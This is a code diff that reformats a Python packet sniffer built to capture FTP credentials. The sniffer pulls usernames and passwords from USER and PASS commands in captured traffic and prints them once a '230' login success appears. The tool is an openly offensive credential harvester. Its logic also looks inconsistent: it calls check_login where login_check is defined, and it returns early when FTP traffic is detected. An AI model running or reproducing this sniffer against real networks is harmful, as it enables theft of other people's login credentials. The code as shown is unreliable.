@@ -17,9 +17,15 @@ passwords = []
 # TODO: Create and write to file instead of printing to screen
 def login_check(pkt, username, password):
     try:
-        if '230' in pkt[Raw].load:
+        if "230" in pkt[Raw].load:
             print("[+] Valid credentials found...")
-            print("[+] " + str(pkt[IP].dst).strip() + "-> " + str(pkt[IP].src).strip() + ": ")
+            print(
+                "[+] "
+                + str(pkt[IP].dst).strip()
+                + "-> "
+                + str(pkt[IP].src).strip()
+                + ": "
+            )
             print(f"[+] Username found: {username}")
             print(f"[+] Password found: {password}")
             return
@@ -27,6 +33,7 @@ def login_check(pkt, username, password):
             return
     except Exception:
         return
+
 
 # Check for the presence of FTP in the packet
 # This focuses on the PORT, rather than the protocol itself
@@ -40,6 +47,7 @@ def check_for_ftp(pkt):
     else:
         return False
 
+
 # Function to add usernames found to a list
 def check_pkt(pkt):
     if check_for_ftp(pkt):
@@ -48,11 +56,12 @@ def check_pkt(pkt):
         return
     data = pkt[Raw].load
     if "USER " in data:
-        usernames.append(data.split('USER ')[1].strip())
+        usernames.append(data.split("USER ")[1].strip())
     elif "PASS " in data:
         passwords.append(data.split("PASS ")[1].strip())
     else:
         check_login(pkt, usernames[-1], passwords[-1])
+
 
 # Print status and sniff
 print(f"[*] Sniffing started on {interface}.")
